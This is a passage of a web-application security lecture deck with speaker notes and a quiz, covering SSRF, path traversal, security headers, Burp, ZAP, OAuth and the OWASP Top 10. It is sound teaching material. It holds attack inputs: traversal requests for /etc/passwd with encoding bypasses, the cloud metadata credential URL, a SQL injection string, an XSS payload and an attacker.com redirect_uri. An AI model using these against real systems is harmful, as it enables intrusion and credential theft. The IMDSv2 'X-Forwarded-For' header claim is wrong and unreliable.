  W -->|"forged server-side request"| MD["Cloud metadata service"]
  A -.-x|"no direct route"| DB
  N["SSRF makes the trusted server the attacker's proxy"] -.- W
:::

:::notes
Server-Side Request Forgery has risen to OWASP A10 in the 2021 Top 10, added as a new standalone category (it was previously covered under other injection categories) because of its increasing prevalence and critical impact in cloud environments. The attack's core mechanic is simple: the attacker finds an application feature that causes the server to make an outbound HTTP request based on user-supplied input, an image URL previewer, a webhook configuration, a URL import feature, an HTML-to-PDF converter, a URL shortener service, and supplies a URL that points to an internal, otherwise-inaccessible resource rather than an external one.

The cloud metadata service attack is the most impactful SSRF scenario in modern infrastructure. Cloud platforms like AWS, GCP, and Azure provide a special HTTP service at the link-local address `169.254.169.254` (an address only reachable from within the cloud network) that allows running EC2 instances, VMs, and containers to query their own metadata and temporary IAM credentials. These credentials are scoped to whatever IAM role is attached to the instance, which in many over-permissioned cloud environments may include broad access to S3 buckets containing sensitive data, EC2 management APIs, RDS databases, or Lambda functions. The 2019 Capital One breach, which exposed approximately 100 million customer records, was caused primarily by an SSRF vulnerability that allowed the attacker to reach the EC2 instance metadata service and steal IAM role credentials with excessive S3 permissions. This breach resulted in a $190 million regulatory settlement and civil penalties.

The defenses against SSRF require a multi-layer approach because the fundamental feature (servers making outbound HTTP requests) is legitimate and necessary for many business functions. Allowlisting is the strongest control: rather than trying to block malicious URLs, the application should only permit outbound requests to a specific allowlist of approved external domains and reject all others. Blocking private IP ranges (RFC 1918 addresses: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), loopback addresses (127.0.0.0/8), and link-local addresses (169.254.0.0/16) at the application level prevents targeting internal resources. Resolving hostnames to IP addresses before applying these checks (to prevent DNS rebinding attacks where an allowed hostname temporarily resolves to an internal IP) adds a further layer. AWS IMDSv2 (Instance Metadata Service version 2) requires requests to include a session token obtained via a PUT request with the `X-Forwarded-For` header, this breaks most SSRF exploits targeting the metadata service because SSRF attacks typically use GET requests. NIST SP 800-53 SC-7 (Boundary Protection) and SI-10 (Input Validation) are the relevant controls.

Server-side request forgery against a cloud instance targets the metadata service: a request to http://169.254.169.254/latest/meta-data/ returns the available metadata paths, and the iam/security-credentials/ path returns the attached role's temporary credentials. This stepwise discovery is how an attacker probes the service, and why egress blocking to the metadata address is the key control.
:::

%%%
---
unit: Injection
code: PATH
title: Directory Traversal and Path Traversal Attacks
---
:::callout style=soft
**Path Traversal** (CWE-22, also called Directory Traversal) occurs when user-supplied input is used to construct a file system path without proper sanitization, allowing an attacker to read or write files outside the intended directory.
:::

::::columns ratio=1:1
::col::
:::code language=http caption="Path traversal exploit, reading /etc/passwd via a file download endpoint"
# Vulnerable endpoint: reads a file from the upload directory
# GET /download?file=invoice_1004.pdf

# Attacker supplies path traversal sequences (../) to escape the upload dir:
GET /download?file=../../../etc/passwd

# URL-encoded variant (bypasses naive string filters):
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd

# Double URL-encoded (bypasses single-decode filters):
GET /download?file=..%252F..%252F..%252Fetc%252Fpasswd

# Unicode variant:
GET /download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
:::
::col::
::::card heading="Files Commonly Targeted"
:::list style=tight
- `/etc/passwd`, Linux user account information
- `/etc/shadow`, Hashed passwords (requires root)
- `/proc/self/environ`, Process environment variables (may contain secrets)
- `C:\Windows\win.ini`, Windows configuration (traversal confirmation)
- `WEB-INF/web.xml`, Java web app config with DB credentials
- `.env`, Application environment file with API keys and secrets
:::
::::
::::card heading="Defenses"
:::list style=tight
- Resolve the canonical (absolute) path of the requested file and verify it begins with the intended base directory before opening.
- Use an allowlist of permitted filenames rather than filtering traversal sequences.
- Never expose raw file system paths in user-visible parameters; use indirect references (numeric IDs mapped to filenames server-side).
:::
::::
::::

:::code language=mermaid caption="Path traversal: the ../ sequence navigates up the directory tree, escaping the intended safe directory. Defense requires resolving the canonical path and verifying it remains within the permitted directory."
flowchart TB
  R["/ (server file system)"] --> V["/var/www/uploads/ (intended safe zone)<br/>invoice_1004.pdf"]
  R --> E["/etc/passwd (outside the safe zone)"]
  Q["Request: file=../../../etc/passwd"] -.->|"each ../ climbs one directory"| E
  D["Defense: resolve the full path and confirm it is still inside /var/www/uploads/"] -.- V
:::

:::notes
Path traversal vulnerabilities represent a direct application of the same unsanitized input problem we see in SQL injection, but targeting the file system rather than a database. The `../` sequence (or its equivalents: `..\` on Windows, URL-encoded `%2F`, double-encoded `%252F`, and various Unicode overlong encodings) causes the file system path resolver to navigate up one directory level. By chaining multiple `../` sequences, an attacker can escape from the intended directory and navigate anywhere on the file system that the web server process has permission to read.

The vulnerability typically appears in file download endpoints, image viewers, template loaders, log file viewers, and any feature that reads a file from disk based on user input. The canonical example is a document download endpoint where the URL parameter contains a filename: `/download?file=report.pdf`. If the server constructs the file path as `open(base_directory + request.args['file'])` without any validation, the attacker can supply `../../../etc/passwd` and the resulting path resolves to `/etc/passwd`, which the server then opens and returns in the HTTP response.

The encoding variants, URL encoding (`%2F`), double URL encoding (`%252F`), and Unicode overlong encodings, are important because they can bypass naive string filters that look for literal `../` sequences. A filter that blocks `../` will fail to block `%2e%2e%2f` (URL-encoded `../`) unless the filter decodes the URL encoding before checking. A filter that handles single-decode will fail to block `%252e%252e%252f` (double-encoded) because decoding once yields `%2e%2e%2f`, which looks safe to the filter, and the actual file path resolution later decodes it a second time. The correct defense is to never attempt to filter or sanitize the path string and then use it, instead, resolve the canonical absolute path using the OS-level path resolution (Python's `os.path.realpath()`, Java's `File.getCanonicalPath()`, Node.js's `path.resolve()`) and verify that the result starts with the intended base directory.

CVE-2019-18935 (Telerik UI for ASP.NET) and CVE-2021-41773 (Apache HTTP Server) are high-profile path traversal vulnerabilities that were actively exploited in the wild within days of disclosure, demonstrating the severity of this vulnerability class. The Apache path traversal bug in 2021 had a CVSS score of 7.5 and allowed unauthenticated reading of arbitrary files. NIST SP 800-53 SI-10 (Information Input Validation) covers the requirement to validate file paths before use. The OWASP Path Traversal Cheat Sheet provides language-specific canonicalization examples.

Platform-specific variations evade generic filters: a Windows path-traversal sequence differs from the Unix form, and null-byte injection (a payload such as filename.pdf%00.png) can defeat validation that checks only the file extension.
:::

%%%
---
unit: Browser Exploits
code: HDRS
title: Security Headers, Defense Configuration Reference
---
:::callout style=soft
HTTP security response headers instruct browsers to enforce security controls that protect users from XSS, clickjacking, protocol downgrade attacks, and information leakage. These headers are low-effort, high-impact mitigations.
:::

:::table
| Header | Purpose | Recommended Value |
|---|---|---|
| `Content-Security-Policy` | Restricts script/style/resource origins; blocks inline script execution | `default-src 'self'; script-src 'self'; object-src 'none'` |
| `Strict-Transport-Security` | Forces HTTPS; prevents protocol downgrade | `max-age=31536000; includeSubDomains; preload` |
| `X-Content-Type-Options` | Prevents MIME-type sniffing (blocks content-type confusion attacks) | `nosniff` |
| `X-Frame-Options` | Prevents clickjacking by blocking embedding in iframes | `DENY` or `SAMEORIGIN` |
| `Referrer-Policy` | Controls how much referrer URL info is sent cross-origin | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Restricts browser feature API access (camera, mic, geolocation) | `geolocation=(), camera=(), microphone=()` |
| `Cache-Control` | Prevents sensitive data from being cached by browsers/proxies | `no-store` (for authenticated pages) |
:::

:::notes
Security headers are one of the most valuable returns on implementation effort in web application security. Most of these headers require only a single configuration line in the web server or application framework middleware to add to every HTTP response, yet they enforce meaningful protective behaviors in every visitor's browser. The securityheaders.com scanner (developed by Scott Helme) provides a free, instant assessment of any public site's security header configuration and is a useful tool for baseline assessments.

Content-Security-Policy, as we discussed in the XSS defense slide, is the most powerful and complex header. Its interaction with CSP Levels 1, 2, and 3 (different browser support tiers) and the ongoing evolution of its directives (adding `trusted-types`, `require-trusted-types-for`, and reporting endpoints) makes it the header that requires the most careful planning. Starting with a Report-Only mode (`Content-Security-Policy-Report-Only`) allows teams to measure violations before enforcing the policy, preventing broken functionality from being deployed silently.

HTTP Strict Transport Security (HSTS) addresses a specific attack called SSL stripping, where a network attacker intercepts the initial HTTP request before the browser sends it to the HTTPS port, downgrades the connection to HTTP, and relays the traffic in plaintext while maintaining an HTTPS connection to the server. HSTS prevents this by instructing the browser to always use HTTPS for the specified domain for the duration specified by `max-age`, even if the user types `http://` in the address bar. The `preload` directive, combined with submission to the HSTS Preload List maintained by Google, hard-codes the HTTPS requirement in browsers before any connection is ever made to the domain, eliminating the first-visit vulnerability window.

The `X-Content-Type-Options: nosniff` header prevents MIME-type sniffing attacks where a browser, when receiving a response with an ambiguous Content-Type header, might attempt to "sniff" the actual content type by examining the file's bytes. This can be exploited to make the browser execute a file it believes is an image or text document as JavaScript or HTML. With `nosniff`, the browser strictly respects the declared Content-Type header.

`X-Frame-Options: DENY` prevents clickjacking attacks, where a malicious site embeds the target application in a transparent iframe overlay and tricks the user into clicking elements within the target (transferring funds, changing passwords, approving permissions) while believing they are interacting with the attacker's site. The modern replacement is the CSP `frame-ancestors` directive, which provides more flexible configuration, but `X-Frame-Options` maintains broad backward compatibility with older browsers.

Organizations can assess their security header configuration against frameworks like the OWASP ASVS (Application Security Verification Standard) Level 1-3 requirements, NIST SP 800-53 SI-10 and SC-8, and the CIS Controls. Automated tools like OWASP ZAP and commercial DAST scanners include security header checks in their standard scan profiles.

Public security-header scanners run against well-known sites often return poor scores even for well-resourced organizations, which shows that security headers, though simple, are frequently neglected and that knowing and advocating for them has real career value.
:::

%%%
---
unit: Tools
code: BURP
title: Tool Spotlight, Burp Suite Professional
---
:::callout style=soft
**Burp Suite** (developed by PortSwigger) is the industry-standard HTTP intercepting proxy and web application security testing platform. Used by penetration testers, bug bounty hunters, and security teams worldwide.
:::

::::columns ratio=1:1
::col::
:::list heading="Core Burp Suite Modules" style=plain
- **Proxy**: Intercepts all HTTP/S traffic between the browser and the server, allowing real-time inspection and modification of any request or response.
- **Repeater**: Resend individual requests with manual modifications, the primary tool for manually testing SQLi, XSS, BOLA, and other injection points.
- **Intruder**: Automates fuzzing and brute-force attacks by iterating a payload list through one or more marked positions in a request.
- **Scanner (Pro)**: Automated active and passive scanning for hundreds of vulnerability types including SQLi, XSS, XXE, SSRF, and CORS misconfigurations.
- **Decoder**: Encode/decode Base64, URL encoding, HTML entities, hex, essential for manipulating JWT tokens and CSRF tokens.
- **Comparer**: Side-by-side diff of two responses, useful for detecting subtle boolean-based blind SQLi response differences.
:::
::col::
:::steps
1. Configure browser to proxy through `127.0.0.1:8080`.
2. Install Burp's CA certificate in the browser to intercept HTTPS.
3. Browse the target application normally, Burp records all requests in the HTTP History tab.
4. Right-click any request → Send to Repeater for manual testing.
5. Modify the target parameter and resend, observe the server response for vulnerability indicators.
6. Right-click → Send to Intruder for automated payload injection.
7. Review Scanner findings (Pro) for passive detections of misconfigured headers, cookie flags, and information leakage.
:::
::::

:::notes
Burp Suite, developed by PortSwigger Web Security, is the tool that most professional penetration testers and web security researchers use as their primary workbench. Understanding how to use Burp Suite, or at minimum, how it works conceptually, is a foundational skill for anyone pursuing a career in offensive security, application security engineering, or security consulting. Bug bounty hunters on platforms like HackerOne and Bugcrowd almost universally use Burp Suite as their primary testing tool.

The HTTP intercepting proxy is the conceptual core of Burp Suite. When the browser is configured to route all its traffic through Burp's local proxy (listening on port 8080 by default), Burp sits in the path of every single HTTP request the browser makes. The security tester can pause (intercept) any request, read and modify every header, cookie, parameter, and body field, and then forward the modified request to the server. This gives testers complete visibility into and control over the application's traffic, a capability that is essential for testing APIs, WebSocket connections, and multi-step business logic flows that automated scanners cannot adequately probe.

The Repeater module is where most manual testing happens. A tester identifies an interesting request in the proxy history (a search endpoint, a file download parameter, an API endpoint with a numeric ID) and sends it to Repeater. In Repeater, they can rapidly modify the request and resend it, observing how the server responds to different inputs. Testing for SQL injection manually involves submitting `'`, `''`, `' OR 1=1--`, and observing whether the response changes in ways that indicate query manipulation. Testing for BOLA involves changing the numeric identifier and verifying whether the server returns another user's data. The speed and flexibility of Repeater make it far more effective than modifying requests in the browser.

Intruder automates the payload-iteration process. A tester marks one or more positions in a request with attack markers (a specific notation Burp uses to indicate where payloads should be inserted) and loads a payload list, a list of SQL injection strings, XSS payloads, path traversal sequences, or enumerated integer values for BOLA testing. Intruder iterates through the payload list, sends each modified request, and records the responses. Testers then look for anomalies: responses that are significantly longer, shorter, take longer to return, or return different HTTP status codes. In Burp Suite Community (the free version), Intruder attacks are rate-limited to slow down the testing; Burp Suite Professional removes this limitation.

PortSwigger's Web Security Academy (portswigger.net/web-security) offers free, deliberately vulnerable web application labs that are specifically designed for Burp Suite practice. These labs cover every OWASP Top 10 category with graded challenges from apprentice to expert level. It is an exceptional free resource for developing practical web application testing skills. The lab environment is browser-based, no installation required beyond Burp itself.

A security tester's workflow is to intercept a login request in a proxy, replay it with modifications, and alter a parameter such as a cookie to observe the server's response. Seeing HTTP interception in action makes the concept concrete rather than abstract.
:::

%%%
---
unit: Tools
code: ZAP
title: Tool Spotlight, OWASP ZAP
---
:::callout style=soft
**OWASP ZAP (Zed Attack Proxy)** is a free, open-source web application security scanner maintained by the OWASP Foundation. Widely used for automated security testing in CI/CD pipelines and as an accessible starting point for security testing training.
:::

::::columns ratio=1:1
::col::
:::list heading="Key ZAP Features" style=plain
- **Automated Scanner**: Active and passive scanning for common web vulnerabilities including SQLi, XSS, CSRF, path traversal, and security header misconfigurations.
- **Spider and AJAX Spider**: Automated discovery of application URLs through link crawling and JavaScript execution, respectively.
- **Passive Scanner**: Analyzes traffic without sending attack requests, identifies information leakage, insecure cookies, and missing security headers just by observing normal browsing.
- **API / OpenAPI Import**: Import a Swagger/OpenAPI specification to automatically discover and scan all defined API endpoints.
- **CI/CD Integration**: ZAP's Docker image and CLI enable automated security scanning as part of a build pipeline, failing the build on critical findings.
- **HUD (Heads-Up Display)**: Overlays security findings directly in the browser window during normal browsing.
:::
::col::
::::card heading="ZAP vs Burp Suite"
:::table
| Feature | OWASP ZAP | Burp Suite Professional |
|---|---|---|
| Cost | Free / Open Source | ~$449/year |
| Automation | Excellent (CI/CD native) | Good (requires Bamboo/plugin) |
| Manual Testing | Moderate | Excellent |
| Scanner Depth | Good | Superior |
| Community | OWASP backed | PortSwigger backed |
:::
::::
::::

:::notes
OWASP ZAP holds a unique position in the web security testing landscape: it is the de facto open-source alternative to Burp Suite, recommended by OWASP and widely used in both professional security assessments and developer-led security testing programs. Where Burp Suite excels at manual, expert-driven testing, ZAP's strengths lie in automation, accessibility, and CI/CD integration.

The passive scanning capability is particularly valuable for developer security testing workflows. When a developer configures their browser to use ZAP as a proxy and runs through the application's normal test cases, ZAP's passive scanner analyzes the traffic without sending any additional requests. It identifies insecure cookie configurations (missing HttpOnly, Secure, or SameSite attributes), missing security headers (CSP, HSTS, X-Frame-Options), information leakage in HTTP response headers (server version strings, framework fingerprinting), and basic authentication exposure. This passive analysis adds zero load to the server and carries no risk of disrupting the application, making it safe to run even against pre-production environments during normal testing.

The active scanner, when enabled, sends specially crafted attack payloads to discovered endpoints to actively test for exploitable vulnerabilities. It covers the majority of OWASP Top 10 categories including SQL injection, XSS, path traversal, XML injection, and SSRF. While not as deep or accurate as Burp Scanner for complex multi-step attack chains, ZAP's active scanner is highly effective at finding common, well-known vulnerability patterns and significantly reduces the manual effort required to identify obvious security flaws before deployment.

ZAP's CI/CD integration is its most distinctive capability in modern DevSecOps programs. The official OWASP ZAP Docker image can be pulled and executed as part of a GitHub Actions workflow, GitLab CI pipeline, or Jenkins job. The `zap-baseline.py` scan provides a fast passive scan of a staging environment as part of the build pipeline, failing the build if critical findings are detected. The `zap-full-scan.py` provides a more comprehensive active scan suitable for nightly or pre-release security checks. This integration model, running security checks automatically on every code push, embodies the "shift left" security principle endorsed by NIST's Secure Software Development Framework (SSDF, NIST SP 800-218).

For security training, ZAP is the recommended starting tool before Burp Suite for several reasons: it is free, it has an active OWASP community and extensive documentation, its interface directly surfaces OWASP Top 10 and CWE mappings in its findings, and its HUD overlay mode provides an excellent visual learning experience for understanding what security tools are detecting in real time. Students who master ZAP develop the conceptual understanding needed to transition effectively to Burp Suite for more advanced testing.

Deliberately vulnerable practice applications such as OWASP WebGoat and DVWA are the right targets for scanner practice; both ship as Docker images and run locally, so testing raises no legal or ethical concerns.
:::

%%%
---
unit: Attack Flow
code: FOW
title: "Scenario: Multi-Stage Web Application Attack"
---
:::steps
1. **Reconnaissance**: Attacker probes API endpoints and maps parameter patterns.
2. **BOLA Exploitation**: Attacker modifies a numeric ID in the URL to scrape valid usernames.
3. **Credential Spraying**: Attacker runs automated logins using the scraped usernames and common passwords.
4. **XSS Injection**: Attacker injects a malicious script payload into a profile comment field.
5. **Session Hijacking**: An administrator views the profile; the script steals their session token.
6. **Privilege Escalation**: Attacker uses the stolen admin session to assume full control.
:::

:::image src="images/22_multistage_attack_chain.png" alt="Horizontal kill-chain diagram with six labeled stages connected by arrows: (1) Reconnaissance, magnifying glass icon over API documentation; (2) BOLA Exploit, URL bar with incrementing ID numbers; (3) Credential Spraying, automated tool icon with username list and password dictionary; (4) XSS Injection, comment field with script tag payload; (5) Session Hijacking, cookie icon being stolen by an arrow pointing to the attacker; (6) Privilege Escalation, admin badge icon. Each stage shows the vulnerability type and OWASP category exploited. The overall diagram uses a red attack-path arrow flowing left to right." caption="Multi-stage web application attack chain: individual vulnerabilities are chained together to escalate from reconnaissance to full administrative compromise." width=full
:::

:::notes
To fully appreciate the danger of web application vulnerabilities, we must understand that attackers rarely rely on a single flaw in isolation. Real-world attacks, particularly those that achieve significant impact, are typically multi-stage operations in which each vulnerability serves as a stepping stone to the next. A single SQLi flaw or a single XSS payload may have limited immediate impact; chained together with reconnaissance, credential attacks, and privilege escalation, they produce total system compromise.

The attack chain presented here represents a realistic scenario drawn from patterns documented in breach investigations and penetration testing reports. In the reconnaissance phase, the attacker behaves like any normal user, browsing the application and recording its structure. They open their browser's developer tools, navigate to the Network tab, and watch the API calls made by the frontend. They notice that profile requests follow a pattern like `/api/v1/user/1004/profile`. This is the beginning of the BOLA discovery. They write a small script that iterates through ID numbers, sending authenticated requests and saving any 200 responses. Within minutes, they have scraped a list of all valid usernames and email addresses in the database.

With a username list in hand, the attacker transitions to credential spraying. Unlike brute force, which targets one account with many passwords, spraying tests one or two common passwords against all accounts, staying below rate-limiting and account lockout thresholds. If even a fraction of users have weak passwords, this attack yields compromised accounts. After gaining access to a low-privileged account, the attacker explores the application for stored XSS vectors. They find a comment or bio field that is displayed to other users, including administrators. They craft a payload that, when executed, reads the victim's session cookie and exfiltrates it via a fetch request to an external logging server.

The attacker then waits. When an administrator reviews the page or moderates the comment, their browser silently executes the script. Their session cookie arrives at the attacker's logging server. The attacker imports this cookie into their browser, navigates to the application, and the server accepts them as the authenticated administrator. The administrative console is now under the attacker's control. This complete attack chain used four distinct OWASP categories: BOLA (API1), authentication weaknesses (A07), stored XSS (A03), and privilege escalation (A01). No single defense would have stopped all stages; only a layered security posture, covering input validation, output encoding, proper authorization checks, MFA, and session security, provides comprehensive protection.
:::

%%%
---
unit: Injection
code: OWASP
title: OWASP Top 10 (2021), Quick Reference
---
:::callout style=soft
The **OWASP Top 10** is the most widely recognized framework for web application security risk. Published every three to four years, it catalogs the most critical security risk categories based on incidence data from hundreds of organizations.
:::

:::table
| Rank | Category | Key CWEs | Example Vulnerability |
|---|---|---|---|
| A01 | Broken Access Control | CWE-22, CWE-284, CWE-285 | BOLA / IDOR, directory traversal, privilege escalation |
| A02 | Cryptographic Failures | CWE-310, CWE-319, CWE-326 | Weak TLS, cleartext passwords, MD5 hashing |
| A03 | Injection | CWE-89, CWE-79, CWE-78 | SQL injection, XSS, OS command injection |
| A04 | Insecure Design | CWE-209, CWE-256 | Missing threat modeling, absent rate limiting |
| A05 | Security Misconfiguration | CWE-16, CWE-611 | Default credentials, verbose error messages, XXE |
| A06 | Vulnerable and Outdated Components | CWE-1104 | Unpatched Log4Shell, outdated jQuery with XSS |
| A07 | Identification and Authentication Failures | CWE-287, CWE-307 | Credential stuffing, missing MFA, weak session tokens |
| A08 | Software and Data Integrity Failures | CWE-494, CWE-502 | CI/CD pipeline injection, insecure deserialization |
| A09 | Security Logging and Monitoring Failures | CWE-117, CWE-778 | No audit logs, no alerting on failed logins |
| A10 | Server-Side Request Forgery (SSRF) | CWE-918 | Cloud metadata theft, internal port scanning |
:::

:::code language=mermaid caption="OWASP Top 10 (2021): the ten most critical web application security risk categories, covering the vulnerabilities addressed throughout this unit."
block-beta
  columns 2
  a1["A01 Broken Access Control"] a2["A02 Cryptographic Failures"]
  a3["A03 Injection"] a4["A04 Insecure Design"]
  a5["A05 Security Misconfiguration"] a6["A06 Vulnerable and Outdated Components"]
  a7["A07 Identification and Authentication Failures"] a8["A08 Software and Data Integrity Failures"]
  a9["A09 Security Logging and Monitoring Failures"] a10["A10 Server-Side Request Forgery"]
:::

:::notes
The OWASP Top 10 is arguably the most influential document in the history of web application security. First published in 2003 and updated in 2007, 2010, 2013, 2017, and most recently 2021, it has shaped security training curricula, penetration testing methodologies, compliance frameworks, and procurement requirements across virtually every industry. PCI DSS, SOC 2, ISO 27001, and NIST Cybersecurity Framework all reference OWASP or align their requirements to its categories. Understanding the OWASP Top 10 is not just useful for technical work, it is a common vocabulary shared across the entire security profession.

The 2021 edition made several notable changes from the 2017 edition. Broken Access Control moved from fifth to first, reflecting a significant increase in documented access control vulnerabilities and emphasizing that BOLA, IDOR, privilege escalation, and directory traversal are now the most prevalent web application risk category. Cryptographic Failures moved up from third to second, with its name changed from "Sensitive Data Exposure" to more accurately reflect that the root cause is cryptographic failure rather than data exposure as a symptom. Injection, which had held the top position in every previous edition from 2010 to 2017, dropped to third, not because injection has become less dangerous, but because access control and cryptographic failures are now more widely documented.

Three categories were new in 2021: Insecure Design (A04), which addresses the absence of security architecture and threat modeling early in the development lifecycle; Software and Data Integrity Failures (A08), which encompasses insecure deserialization and the supply chain attack risks exemplified by the SolarWinds compromise; and Server-Side Request Forgery (A10), elevated to its own category due to the prevalence and severity of SSRF in cloud environments.

An important nuance about the OWASP Top 10 is that it represents risk categories, not individual vulnerabilities. Each category encompasses multiple CWE-identified vulnerability types. A03 Injection alone includes SQL injection (CWE-89), Cross-Site Scripting (CWE-79), OS command injection (CWE-78), LDAP injection (CWE-90), XPath injection (CWE-643), and others. This means that fixing "injection" as a category requires understanding and addressing multiple distinct technical issues across different parts of the application stack.

The OWASP Application Security Verification Standard (ASVS) provides a more granular, testable counterpart to the Top 10. Where the Top 10 describes risk categories at a conceptual level, ASVS provides specific, testable security requirements at three levels of rigor (Level 1 for all applications, Level 2 for applications handling sensitive data, Level 3 for the highest-criticality applications). ASVS maps its requirements to OWASP Top 10 categories, NIST SP 800-63 authentication standards, and PCI DSS requirements, making it the bridge between risk awareness and practical implementation.

Recent major breaches map onto OWASP Top 10 categories, credential stuffing to A07, supply chain attacks to A08, Log4Shell to A06, which shows the categories correspond to real incidents happening continuously rather than theoretical risks.
:::

%%%
---
unit: Authentication
code: OAUTH
title: OAuth 2.0 and Common Misconfigurations
---
:::callout style=soft
**OAuth 2.0** is the industry-standard protocol for delegated authorization. Misconfigurations in OAuth flows introduce account takeover vulnerabilities, token theft, and open redirect exploitation, independent of the underlying application's own security controls.
:::

::::columns ratio=1:1
::col::
:::list heading="OAuth 2.0 Core Concepts" style=plain
- **Resource Owner**: The user who grants permission (you, when you click "Allow").
- **Client**: The application requesting access (e.g., a third-party app requesting your Google profile).
- **Authorization Server**: Issues tokens after user consent (e.g., Google's OAuth server).
- **Resource Server**: Holds the protected resource (e.g., Google's People API).
- **Access Token**: Short-lived credential the client uses to call the resource server.
- **Authorization Code**: Single-use code exchanged for an access token, PKCE prevents interception.
:::
::col::
::::card heading="Common OAuth Misconfigurations"
:::list style=tight
- **Open Redirect in redirect_uri**: If the authorization server does not validate the exact `redirect_uri`, the attacker can redirect the authorization code to an attacker-controlled server.
- **Missing State Parameter**: Omitting the random `state` parameter makes the OAuth flow vulnerable to CSRF, an attacker can trick a user into authorizing attacker-controlled credentials to the victim's account.
- **Implicit Grant Tokens in URL Fragments**: The deprecated Implicit flow passes tokens in URL fragments visible in browser history, Referer headers, and server logs.
- **Excessive Scope Grants**: Applications requesting `email profile openid` when only `openid` is needed, violates the principle of least privilege.
:::
::::
::::

:::code language=mermaid caption="OAuth 2.0 flow: the state parameter prevents CSRF; exact redirect_uri validation prevents code interception. Both controls are required for a secure OAuth implementation."
sequenceDiagram
  participant U as User
  participant App as App
  participant G as Google (authorization server)
  U->>App: Login with Google
  App->>G: Redirect with client_id, scope, state, redirect_uri
  U->>G: Authenticates and consents
  G-->>App: Authorization code to the registered redirect_uri
  App->>G: Code + client secret (back channel)
  G-->>App: Access token
  Note over U,G: Common misconfigurations: loose redirect_uri matching,<br/>missing state check (CSRF), tokens in URLs
:::

:::notes
OAuth 2.0 (RFC 6749) is ubiquitous in modern web and mobile applications, the "Log in with Google/Facebook/GitHub/Apple" buttons that appear across thousands of applications are OAuth 2.0 implementations. When implemented correctly, OAuth provides a secure mechanism for delegated authorization that keeps the user's primary credentials (their Google or Facebook password) away from third-party applications. When implemented incorrectly, OAuth flows introduce account takeover vulnerabilities that are invisible to both the user and naive security testing.

The most impactful OAuth vulnerability is redirect_uri manipulation. The OAuth Authorization Code flow works by redirecting the user's browser to the authorization server with a `redirect_uri` parameter specifying where to send the authorization code after the user consents. The authorization server is supposed to validate that this redirect_uri exactly matches one of the URIs registered by the client application at the time the OAuth client was created. If the authorization server performs insufficient validation, accepting any URI under the registered domain, or accepting wildcards, an attacker can specify `redirect_uri=https://attacker.com/steal` in the authorization request. When the user consents, their authorization code is sent to the attacker's server instead of the legitimate application. The attacker exchanges this code for an access token and gains access to the user's account on the resource server. This class of vulnerability has been documented in major platforms including Facebook, GitHub, and Microsoft's Azure AD.

The missing state parameter vulnerability makes OAuth flows susceptible to CSRF. The `state` parameter should be a cryptographically random value generated by the client application, embedded in the authorization request, and verified when the authorization server redirects back with the code. If an attacker initiates an OAuth authorization flow for their own account, captures the redirect URL containing the code, and tricks a victim into loading that URL, the victim's application session would link the attacker's OAuth credentials to the victim's account, allowing the attacker to subsequently log in as the victim using the "Login with [Provider]" button. The `state` parameter prevents this by tying each authorization flow to the specific browser session that initiated it.

The Implicit grant type, now deprecated in OAuth 2.1, delivered access tokens directly in the redirect URL fragment (the `#` portion of the URL). This meant the access token appeared in browser history, server access logs (if the token appeared in a URL path rather than fragment), and Referer headers sent to third parties. The Authorization Code flow with PKCE (Proof Key for Code Exchange, RFC 7636) replaces the Implicit flow for single-page applications and mobile apps, providing equivalent functionality without the token-in-URL security risk.

The PortSwigger Web Security Academy OAuth labs, and Frans Rosen's research on OAuth vulnerabilities, give hands-on practice with the most common misconfiguration, authentication bypass via a manipulated redirect_uri parameter.
:::

%%%
---
unit: Summary
code: CHECK
title: Mid-Unit Checkpoint, Web Application Attack Concepts
---
:::callout style=soft
Pause and assess your understanding before the final summary. These questions mirror the reasoning required in security assessments, CTF challenges, and security certification exams.
:::

::::columns ratio=1:1
::col::
:::list heading="Test Your Understanding" style=plain
- **Q1**: A login form concatenates username input into a SQL query. What input would authenticate as any user without knowing any password? What structural fix prevents this?
- **Q2**: An API endpoint returns `/api/v1/orders/5542` for a logged-in user. What two questions should an attacker ask? What check does the server need to perform?
- **Q3**: A website stores user comments and displays them to other users without HTML encoding. A researcher submits `<img src=x onerror=alert(1)>`. What happens? Which XSS type is this?
- **Q4**: A JWT has `"alg": "none"` in its header. What does this mean for signature verification? Can this be exploited?
- **Q5**: An image preview feature accepts a URL and fetches it server-side. What internal URL might an attacker supply on AWS infrastructure, and what data might be returned?
:::
::col::
:::list heading="Answers and Key Takeaways" style=plain
- **A1**: Input `' OR '1'='1' --` closes the string and appends a always-true condition. Fix: parameterized queries separate SQL structure from user data at compilation time.
- **A2**: "Can I access other orders by changing the ID?" and "Does the server check that I own order 5542?" Fix: server must verify that the authenticated user owns the requested object before returning it.
- **A3**: Every user who loads the comment page will have `alert(1)` execute in their browser. This is Stored (Persistent) XSS, the payload is saved in the database and delivered to all visitors.
- **A4**: `alg: none` means no signature is applied or verified. A vulnerable server skips signature checking entirely, allowing an attacker to forge any claims by editing the payload and setting `alg: none`.
- **A5**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, the AWS EC2 instance metadata service returns temporary IAM credentials that may allow access to S3, EC2, and other AWS services.
:::
::::

:::notes
This checkpoint slide serves a deliberate pedagogical purpose: spaced retrieval practice. Research in cognitive psychology, particularly the work of Roediger and Karpicke on the testing effect, consistently demonstrates that attempting to recall information, even when retrieval is difficult or partially unsuccessful, produces stronger long-term retention than re-reading or re-watching the same material. By pausing at the two-thirds point of a technical lecture and asking students to apply concepts from earlier slides to short scenario questions, we activate and strengthen the memory traces formed during the lecture.

Each question in this checkpoint is designed to require application-level reasoning rather than simple recall. It is not sufficient to remember that SQL injection exists, the student must reason from the vulnerability mechanism (string concatenation) to a specific exploit payload (`' OR '1'='1' --`) and then to the correct structural defense (parameterized queries). This reasoning process, vulnerability to exploit to defense, mirrors the mental model used in professional security assessment, CTF competitions, and certification exams like OSCP, CEH, and GSEC.

For Question 2 (BOLA), the two questions "can I access other orders by changing the ID?" and "does the server check that I own this order?" map directly to the BOLA root cause analysis. The first question is the attacker's discovery methodology; the second is the server-side authorization check that should exist but is missing. If students can articulate both questions, they understand not just what BOLA is but how it is found and why it occurs.

For Question 3 (XSS type identification), the key recognition is that the payload is submitted to the server for storage and served to other users, this distinguishes Stored XSS from Reflected XSS (which requires a phishing link per victim) and DOM XSS (which never touches the server). The `<img src=x onerror=...>` payload is also important because it demonstrates that XSS does not require a `<script>` tag, any HTML element with an event handler attribute can be used, a fact that many simple input filters fail to account for.

